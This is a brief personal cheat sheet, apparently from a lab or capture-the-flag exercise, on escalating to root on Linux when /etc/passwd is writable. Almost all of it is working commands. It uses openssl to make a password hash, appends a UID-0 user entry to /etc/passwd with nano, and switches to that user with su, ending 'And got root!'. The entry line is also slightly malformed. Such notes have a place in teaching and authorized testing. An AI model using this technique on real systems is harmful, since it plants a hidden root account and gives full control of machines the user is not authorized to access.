<pre>
Priv esc with /etc/passwd:
/etc/passwd -> weak and can modify by others

    Lets make new user:
        $ openssl passwd -1 -salt arnav pass123 
            Result: $1$arnav$o8F/YObXhnuM67NCy.3fk1

    arnav:$1$arnav$o8F/YObXhnuM67NCy.3fk1:0:0:/root/root:/bin/bash
        $ nano /etc/passwd
        Add arnav:$1$arnav$o8F/YObXhnuM67NCy.3fk1:0:0:/root/root:/bin/bash at the end of file
        $ su arnav
        $ pass123

        And got root! :D
</pre>
